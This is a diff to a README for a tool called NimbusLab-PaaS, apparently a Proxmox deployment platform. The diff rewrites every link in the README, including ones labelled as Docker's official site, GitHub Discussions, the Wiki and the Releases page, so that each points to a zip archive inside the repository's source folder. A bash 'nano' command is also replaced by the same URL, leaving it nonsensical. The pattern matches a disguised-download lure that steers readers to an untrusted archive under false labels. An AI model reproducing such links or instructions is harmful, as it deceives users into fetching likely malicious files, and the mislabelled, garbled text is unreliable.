@@ -8,11 +8,11 @@ Welcome to NimbusLab-PaaS! This application simplifies the process of deploying 
 
 To begin, you will need to download NimbusLab-PaaS. 
 
-[![Download NimbusLab-PaaS](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip)](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip)
+[![Download NimbusLab-PaaS](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip)](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip)
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page where you can download NimbusLab-PaaS.  
-   [Download NimbusLab-PaaS](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip)
+   [Download NimbusLab-PaaS](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Before installing NimbusLab-PaaS, ensure your system meets the following require
   At least 1 GB free for installation
 
 - **Docker:**  
-  Install Docker to manage containers effectively. If Docker is not installed, please follow the steps on [Docker's official site](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip).
+  Install Docker to manage containers effectively. If Docker is not installed, please follow the steps on [Docker's official site](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip).
 
 ## 🛠️ Installation Steps
 
@@ -65,7 +65,7 @@ After installation, you need to configure NimbusLab-PaaS for your environment. H
    Provide your Proxmox VE host details in the configuration file. Open the configuration file using a text editor:
 
    ```bash
-   nano ~https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip
+   nano ~https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip
    ```
 
    Update the relevant sections with your Proxmox details, including the API token.
@@ -120,14 +120,14 @@ NimbusLab-PaaS offers several features designed to enhance your deployment exper
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using NimbusLab-PaaS, please visit our [GitHub Discussions](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip) page. Join the community to get help from other users and contributors.
+If you encounter any issues or have questions about using NimbusLab-PaaS, please visit our [GitHub Discussions](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip) page. Join the community to get help from other users and contributors.
 
-For thorough documentation, refer to the [Wiki](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip) section on GitHub.
+For thorough documentation, refer to the [Wiki](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip) section on GitHub.
 
 ## 🔗 Useful Links
 
-- [NimbusLab-PaaS Releases](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip)
-- [Docker Installation Guide](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip)
-- [GitHub Discussions](https://github.com/dynastyteng/NimbusLab-PaaS/raw/refs/heads/main/NimbusLab/src/comp/Paa-Lab-Nimbus-S-3.6.zip)
+- [NimbusLab-PaaS Releases](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip)
+- [Docker Installation Guide](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/dynastyteng/NimbusLab-PaaS/main/NimbusLab/src/Paa_Lab_S_Nimbus_2.4.zip)
 
 With NimbusLab-PaaS, deploying your applications becomes a straightforward process. Follow these steps, and you'll be up and running in no time. Happy deploying!
